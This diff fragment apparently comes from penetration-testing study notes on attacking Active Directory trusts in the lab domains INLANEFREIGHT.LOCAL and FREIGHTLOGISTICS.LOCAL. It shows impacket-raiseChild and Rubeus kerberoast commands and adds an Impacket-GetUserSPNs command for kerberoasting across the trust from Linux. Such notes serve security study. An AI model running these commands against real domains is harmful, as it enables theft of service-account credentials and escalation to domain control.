@@ -56,3 +56,7 @@ impacket-raiseChild -target-exec 172.16.5.5(dc ip of Parent Domain) LOGISTICS.IN
 ```
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL(parent domain) /user:mssqlsvc(optional) /nowrap
 ```
+Linux
+```
+Impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley(a user that can authenticate into the other domain)
+```
